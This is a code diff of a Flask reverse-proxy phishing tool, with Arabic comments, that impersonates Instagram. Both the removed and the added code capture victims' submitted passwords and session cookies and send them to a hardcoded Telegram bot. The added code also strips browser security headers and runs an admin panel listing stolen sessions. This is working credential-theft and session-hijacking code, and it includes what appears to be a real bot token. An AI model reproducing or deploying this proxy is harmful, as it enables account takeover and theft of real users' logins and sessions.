@@ -1,186 +1,165 @@
-from flask import Flask, request, make_response, redirect, url_for, after_this_request
+from flask import Flask, request, make_response, redirect, url_for, render_template_string
 import requests
 import logging
 import json
 from datetime import datetime
 import os
 import urllib3
-from urllib.parse import urlparse, urlunparse
+import re
+from urllib.parse import urljoin, urlparse
 
+# إعدادات الحماية والتحذيرات
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc')
-TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '1367401179')
-
 app = Flask(__name__)
-app.secret_key = os.urandom(32).hex()
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
+app.secret_key = os.environ.get('SECRET_KEY', os.urandom(64).hex())
 
-captured_sessions = {}  # لتخزين الجلسات في لوحة التحكم
+# إعداد السجلات الاحترافية
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s')
 
-def send_telegram_message(message):
-    try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
-        requests.post(url, json=payload, timeout=10)
-    except Exception as e:
-        logging.error(f"Telegram error: {e}")
+# إعدادات التلجرام (تأكد من ضبطها في Render)
+BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc')
+CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '1367401179')
 
-def extract_login_credentials(data):
-    """محاولة استخراج اسم المستخدم وكلمة المرور من JSON"""
-    credentials = {}
-    if isinstance(data, dict):
-        if 'username' in data:
-            credentials['username'] = data['username']
-        if 'enc_password' in data:
-            credentials['enc_password'] = data['enc_password']
-        if 'password' in data:
-            credentials['password'] = data['password']
-        if 'email' in data:
-            credentials['email'] = data['email']
-    return credentials
+# قواعد بيانات مؤقتة
+sessions_db = {}
+creds_db = {}
 
-def is_login_path(path):
-    """تحديد ما إذا كان المسار هو مسار تسجيل دخول"""
-    login_paths = ['/api/v1/web/accounts/login/', '/accounts/login/ajax/', '/login/']
-    return any(p in path for p in login_paths)
+class UltimateEngine:
+    def __init__(self):
+        self.target = 'www.instagram.com'
+        self.proxy_domains = [
+            'www.instagram.com', 'instagram.com', 'i.instagram.com',
+            'static.cdninstagram.com', 'scontent.cdninstagram.com'
+        ]
+        self.critical_cookies = ['sessionid', 'ds_user_id', 'csrftoken']
+
+    def notify_telegram(self, msg):
+        try:
+            # تقسيم الرسائل الطويلة جداً
+            for i in range(0, len(msg), 4000):
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                             json={'chat_id': CHAT_ID, 'text': msg[i:i+4000], 'parse_mode': 'HTML'}, timeout=10)
+        except Exception as e:
+            logging.error(f"Telegram Error: {e}")
+
+    def capture_full_session(self, cookies, ip, host):
+        c_dict = requests.utils.dict_from_cookiejar(cookies)
+        if any(c in c_dict for c in self.critical_cookies):
+            sid = datetime.now().strftime("%y%m%d_%H%M%S")
+            sessions_db[sid] = {'cookies': c_dict, 'ip': ip, 'time': str(datetime.now())}
+            
+            # تنسيق الكوكيز بشكل Evilginx الاحترافي
+            cookie_str = "\n".join([f"<b>{k}</b>: <code>{v}</code>" for k, v in c_dict.items()])
+            alert = (f"🔥 <b>[VICTIM HIJACKED]</b>\n"
+                    f"🆔 ID: <code>{sid}</code>\n"
+                    f"🌐 IP: <code>{ip}</code>\n"
+                    f"🍪 <b>FULL COOKIES:</b>\n{cookie_str}\n"
+                    f"🔗 Admin: https://{host}/admin/dashboard")
+            self.notify_telegram(alert)
+            return True
+        return False
+
+    def process_content(self, content, c_type, host):
+        if any(ext in str(c_type).lower() for ext in ['html', 'javascript', 'json', 'css']):
+            try:
+                text = content.decode('utf-8', errors='ignore')
+                # استبدال النطاقات بذكاء
+                for d in self.proxy_domains:
+                    text = text.replace(f"https://{d}", f"https://{host}")
+                    text = text.replace(d, host)
+                
+                # تعطيل ميزات الأمان في المتصفح للضحية
+                text = text.replace('Content-Security-Policy', 'X-Ignored-CSP')
+                text = text.replace('frame-ancestors', 'none-disabled')
+                
+                return text.encode('utf-8')
+            except: return content
+        return content
+
+engine = UltimateEngine()
+
+@app.route('/admin/dashboard')
+def dashboard():
+    template = """
+    <html><head><title>MASTER PANEL</title><style>
+    body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:30px;}
+    .card{border:1px solid #00ff00;padding:15px;margin:10px 0;background:#111;}
+    pre{color:#00ffff;white-space:pre-wrap;}
+    </style></head><body>
+    <h1>[ SYSTEM STATUS: ACTIVE ]</h1>
+    <h3>SESSIONS: {{ s_len }} | CREDS: {{ c_len }}</h3>
+    {% for id, s in sessions.items() %}
+    <div class="card"><b>ID: {{ id }}</b> [{{ s.time }}] - IP: {{ s.ip }}<br><pre>{{ s.cookies | tojson(indent=2) }}</pre></div>
+    {% endfor %}
+    <br><a href="/admin/clear" style="color:red">WIPE ALL DATA</a>
+    </body></html>
+    """
+    return render_template_string(template, sessions=sessions_db, s_len=len(sessions_db), c_len=len(creds_db))
+
+@app.route('/admin/clear')
+def clear():
+    sessions_db.clear()
+    return redirect('/admin/dashboard')
 
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
-def proxy(path):
-    # بناء عنوان الهدف
-    target_domain = 'www.instagram.com'
-    target_url = f'https://{target_domain}/{path}'
+def master_proxy(path):
+    host = request.headers.get('Host', '').split(':')[0]
+    target_url = urljoin(f"https://{engine.target}", path)
     if request.query_string:
         target_url += '?' + request.query_string.decode('utf-8')
 
-    # نقل جميع الرؤوس مع تعديل Host فقط
-    headers = dict(request.headers)
-    headers['Host'] = target_domain
+    # منع الضغط نهائياً لضمان قراءة البيانات
+    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'content-length', 'accept-encoding']}
+    headers['Host'] = engine.target
+    headers['Referer'] = f"https://{engine.target}/"
 
-    # إزالة بعض الرؤوس التي قد تسبب مشاكل
-    headers.pop('Content-Length', None)
-    headers.pop('Connection', None)
-
-    # نقل جميع الكوكيز من الطلب
-    cookies = request.cookies
-
-    # الحصول على بيانات الطلب
-    data = request.get_data()
-
-    captured_creds = None
-    # إذا كان الطلب POST ومسار تسجيل دخول، نحاول التقاط بيانات الدخول
-    if request.method == 'POST' and is_login_path(path):
-        content_type = request.headers.get('Content-Type', '')
-        if 'application/json' in content_type:
-            try:
-                json_data = request.get_json(silent=True) or {}
-                captured_creds = extract_login_credentials(json_data)
-                if captured_creds:
-                    logging.info(f"Captured login credentials: {captured_creds}")
-                    # إرسال إشعار بسيط
-                    msg = (f"🔐 <b>Login Credentials Captured</b>\n"
-                           f"<pre>{json.dumps(captured_creds, indent=2)}</pre>")
-                    send_telegram_message(msg)
-            except:
-                pass
+    # التقاط بيانات الـ POST (كلمات المرور)
+    if request.method == 'POST':
+        data = request.form.to_dict() or request.get_json(silent=True) or {}
+        if data:
+            cid = datetime.now().strftime("%H%M%S")
+            creds_db[cid] = data
+            engine.notify_telegram(f"🔐 <b>[LOGIN DATA]</b>\n<pre>{json.dumps(data, indent=2)}</pre>")
 
     try:
-        # إرسال الطلب إلى الهدف
         resp = requests.request(
-            method=request.method,
-            url=target_url,
-            headers=headers,
-            cookies=cookies,
-            data=data,
-            allow_redirects=False,
-            verify=False,
-            timeout=30
+            method=request.method, url=target_url, headers=headers,
+            cookies=request.cookies, data=request.get_data(),
+            allow_redirects=False, verify=False, timeout=25
         )
 
-        # بناء استجابة Flask
-        proxy_response = make_response(resp.content)
-        proxy_response.status_code = resp.status_code
+        # معالجة المحتوى والحماية
+        processed_body = engine.process_content(resp.content, resp.headers.get('Content-Type', ''), host)
+        
+        proxy_resp = make_response(processed_body)
+        proxy_resp.status_code = resp.status_code
 
-        # نقل الرؤوس (مع استثناء بعضها)
-        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
-        for key, value in resp.headers.items():
-            if key.lower() not in excluded_headers:
-                proxy_response.headers[key] = value
+        # تصفية الرؤوس الأمنية والضغط
+        for k, v in resp.headers.items():
+            if k.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'content-security-policy', 'x-frame-options', 'strict-transport-security']:
+                proxy_resp.headers[k] = v
 
-        # نقل الكوكيز من الاستجابة إلى العميل
-        for cookie_name, cookie_value in resp.cookies.items():
-            proxy_response.set_cookie(cookie_name, cookie_value, domain=request.host, secure=True, httponly=True, samesite='Lax')
+        # تثبيت الكوكيز على نطاقك
+        for c_name, c_value in resp.cookies.items():
+            proxy_resp.set_cookie(c_name, c_value, domain=host, secure=True, httponly=True, samesite='Lax')
 
-        # التحقق من وجود كوكيز جلسة صالحة
+        # خطف الجلسة إذا اكتمل الدخول
         if resp.cookies:
-            cookies_dict = resp.cookies.get_dict()
-            # إذا وجدنا sessionid، هذه جلسة صالحة
-            if 'sessionid' in cookies_dict:
-                session_id = datetime.now().strftime("%y%m%d_%H%M%S")
-                captured_sessions[session_id] = {
-                    'site': 'Instagram',
-                    'cookies': cookies_dict,
-                    'timestamp': str(datetime.now()),
-                    'ip': request.remote_addr
-                }
-                # إرسال إشعار بالجلسة
-                important_cookies = {k: v for k, v in cookies_dict.items() if k in ['sessionid', 'ds_user_id', 'csrftoken']}
-                msg = (f"🔥 <b>Valid Session Hijacked!</b>\n"
-                       f"🆔 <b>Session ID:</b> <code>{session_id}</code>\n"
-                       f"🍪 <b>Cookies:</b>\n<pre>{json.dumps(important_cookies, indent=2)}</pre>\n"
-                       f"🔗 <b>Dashboard:</b> https://{request.host}/admin/dashboard")
-                send_telegram_message(msg)
-                logging.info(f"Valid session captured: {session_id}")
+            engine.capture_full_session(resp.cookies, request.remote_addr, host)
 
-        # معالجة التوجيه (redirects)
+        # معالجة التوجيه (Redirect)
         if resp.status_code in [301, 302, 303, 307, 308]:
-            location = resp.headers.get('Location', '')
-            if location:
-                parsed = urlparse(location)
-                if 'instagram.com' in parsed.netloc:
-                    # استبدال النطاق بنطاقنا
-                    new_location = location.replace(parsed.netloc, request.host)
-                    proxy_response.headers['Location'] = new_location
+            loc = resp.headers.get('Location', '')
+            if engine.target in loc:
+                proxy_resp.headers['Location'] = loc.replace(engine.target, host)
 
-        return proxy_response
+        return proxy_resp
 
     except Exception as e:
-        logging.error(f"Proxy error: {str(e)}")
-        return f"Service Unavailable", 503
-
-# مسارات لوحة التحكم
-@app.route('/admin/dashboard')
-def admin_dashboard():
-    try:
-        sessions_list = []
-        for sid, data in captured_sessions.items():
-            sessions_list.append({
-                'id': sid,
-                'site': data['site'],
-                'cookies_count': len(data['cookies']),
-                'timestamp': data['timestamp'],
-                'ip': data['ip']
-            })
-        # عرض بسيط (يمكنك تحسينه لاحقاً)
-        html = "<h1>Captured Sessions</h1><ul>"
-        for s in sessions_list:
-            html += f"<li><b>{s['id']}</b> - {s['site']} - {s['cookies_count']} cookies - {s['timestamp']} - {s['ip']} <a href='/admin/session/{s['id']}'>View</a></li>"
-        html += "</ul><a href='/admin/clear'>Clear All</a>"
-        return html
-    except Exception as e:
-        return f"Dashboard Error: {str(e)}", 500
-
-@app.route('/admin/session/<session_id>')
-def get_session(session_id):
-    if session_id in captured_sessions:
-        return make_response(json.dumps(captured_sessions[session_id], indent=2), 200, {'Content-Type': 'application/json'})
-    return "Session not found", 404
-
-@app.route('/admin/clear')
-def clear_sessions():
-    captured_sessions.clear()
-    return redirect(url_for('admin_dashboard'))
+        logging.error(f"FATAL: {e}")
+        return "SERVICE BUSY", 503
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 10000))
